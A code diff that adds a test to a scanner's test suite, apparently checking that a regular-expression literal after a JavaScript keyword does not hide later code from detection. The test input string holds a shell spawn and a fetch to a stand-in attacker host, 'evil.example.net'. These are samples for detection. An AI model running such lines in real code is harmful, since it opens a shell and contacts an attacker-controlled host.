@@ -223,6 +223,19 @@ test("the scan ignores comments, but not an address in a string that holds two s
     });
 });
 
+test("a regular expression after a keyword does not hide the code after it", () => {
+    for (const keyword of "return typeof void delete throw case in of new else do yield await".split(
+        " ",
+    )) {
+        const scanned = scanCode(
+            `${keyword} /^https?:\\/\\//.test(u); spawn("sh"); fetch("https://evil.example.net/x");`,
+        );
+
+        assert.deepEqual(scanned.network, ["evil.example.net"], keyword);
+        assert.deepEqual(scanned.programs, ["sh"], keyword);
+    }
+});
+
 test("the scan of several files is one scan of their code", () => {
     const scanned = scanFiles([
         { name: "a.ts", text: 'const u = "https://one.dev";' },
